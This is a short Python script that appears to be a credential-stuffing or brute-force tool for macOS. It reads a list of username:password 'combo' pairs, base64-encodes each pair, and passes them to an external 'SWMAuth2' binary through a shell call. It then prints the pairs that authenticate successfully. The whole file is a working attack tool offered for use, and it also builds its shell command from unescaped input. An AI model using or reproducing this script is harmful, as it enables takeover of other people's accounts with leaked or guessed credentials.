import base64
import os
import sys

if sys.platform != "darwin":
    print("This script only works on a mac")
    sys.exit()

user_file = 'user.txt'

if not os.path.isfile(user_file):
    with open(user_file, 'w') as f:
        f.write('Put your combo here')
    print(f'{user_file} created, please fill it with your combo user:pass')
    sys.exit()

print(f"{user_file} found")

swm_auth_file = 'SWMAuth2'

if not os.path.isfile(swm_auth_file):
    print(f'{swm_auth_file} not found, please put it in the same folder as the bruteforce.py')
    sys.exit()

print(f"{swm_auth_file} found")
print("Starting bruteforce...")
print("-"*50)

try:
    with open(user_file, 'r') as f:
        for line in f:
            usern, passwordn = line.strip().split(':')
            user = base64.b64encode(usern.encode('utf-8'))
            password = base64.b64encode(passwordn.encode('utf-8'))
            cmd = f'./{swm_auth_file} {user.decode("utf-8")} {password.decode("utf-8")}'
            output = os.popen(cmd).read()
            if 'result:true' in output:
                print('Success!')
                print(f'\tUsername: {usern}')
                print(f'\tPassword: {passwordn}')
                print("-"*50)

except ValueError:
    print('user.txt is not in the correct format ex:(username:password), please check it')
    sys.exit()
except KeyboardInterrupt:
    os.system('clear')
    print('Exiting...')
    sys.exit()
